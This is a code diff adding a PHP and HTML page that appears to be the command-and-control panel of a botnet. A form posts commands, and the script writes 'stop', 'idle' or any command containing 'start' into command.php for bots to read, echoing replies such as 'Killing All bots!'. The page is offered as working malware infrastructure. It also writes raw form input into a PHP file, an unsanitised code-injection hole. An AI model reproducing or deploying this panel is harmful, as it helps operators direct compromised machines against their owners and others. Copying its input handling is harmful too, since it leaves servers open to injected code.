@@ -1,0 +1,86 @@
+<head> 
+<style> 
+
+    .box { 
+        width:400px; 
+        margin-left: auto; 
+        margin-right: auto; 
+        background-color: #000; 
+        color: green; 
+        border: 5px solid #c4cde0; 
+        -webkit-border-radius: 10px; 
+        height: 200px; 
+    } 
+    .input { 
+        border: 1px solid green; 
+        background-color: #000; 
+        width:340px; 
+        color: green; 
+    } 
+    .btn { 
+        border: 1px solid green; 
+        background-color: #000; 
+        width:50px; 
+        color: green; 
+    } 
+    .cmd { 
+        margin-left: auto; 
+        margin-right: auto; 
+        margin-top:10px; 
+        border: 1px solid green; 
+        background-color: #000; 
+        width: 390px; 
+        height:150px; 
+        color: green; 
+        max-height:150px; 
+        font-family: Georgia; 
+    } 
+</style> 
+</head> 
+<body bgcolor="#0404B4"> 
+<div class="box"> 
+    <div class="cmd"> 
+        <?php 
+            $command = $_POST['command']; 
+            if($command != null) { 
+                if($command == "stop") { 
+        unlink('command.php'); 
+        $fh = fopen('command.php', 'a'); 
+        fwrite($fh, 'stop'); 
+        fclose($fh); 
+        echo "Command Sent> ".$command."<br> 
+        Response Given> Killing All bots! 
+        "; 
+                } 
+                else if(strstr($command,'start')) { 
+        unlink('command.php'); 
+        $fh = fopen('command.php', 'a'); 
+        fwrite($fh, ''.$command.''); 
+        fclose($fh); 
+        echo "Command Sent> ".$command."<br> 
+        Response Given> Running $command 
+        "; 
+                } 
+                else { 
+        unlink('command.php'); 
+        $fh = fopen('command.php', 'a'); 
+        fwrite($fh, 'idle'); 
+        fclose($fh); 
+        echo "Command Sent> ".$command."<br> 
+        Response Given> Command Not Found 
+        "; 
+                } 
+            } 
+            else { 
+                echo "Please enter a command"; 
+            } 
+
+        ?> 
+    </div> 
+    <div> 
+        <center><form action="" method="POST"><input type="text" class="input" name="command" id="cmd-text"><button class="btn" onClick="send()">Send</button></form></center> 
+    </div> 
+</div> 
+
+Copyright (c) Underground Security Office
+</body>
